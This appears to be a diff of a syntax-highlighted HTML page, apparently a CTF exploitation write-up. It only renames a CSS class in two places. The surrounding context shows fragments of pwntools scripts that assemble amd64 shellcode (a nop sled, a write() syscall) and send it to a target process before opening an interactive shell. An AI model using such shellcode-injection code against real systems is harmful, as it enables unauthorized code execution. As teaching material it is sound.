@@ -213,7 +213,7 @@ shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class
     nop
     nop
     nop
-"""</span><span class="p">,</span><span class="am"> arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
+"""</span><span class="p">,</span><span class="ra"> arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">".</span><span class="mi">\n</span><span class="s">"</span><span class="p">, shellcode)
 shell.interactive()</span>
@@ -468,7 +468,7 @@ shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class
     push 0x1        # write()
     pop rax         # $rax = write()
     syscall         # syscall()
-"""</span><span class="p">, </span><span class="am">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
+"""</span><span class="p">, </span><span class="ra">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">".</span><span class="mi">\n</span><span class="s">"</span><span class="p">, shellcode)
 shell.interactive()</span>
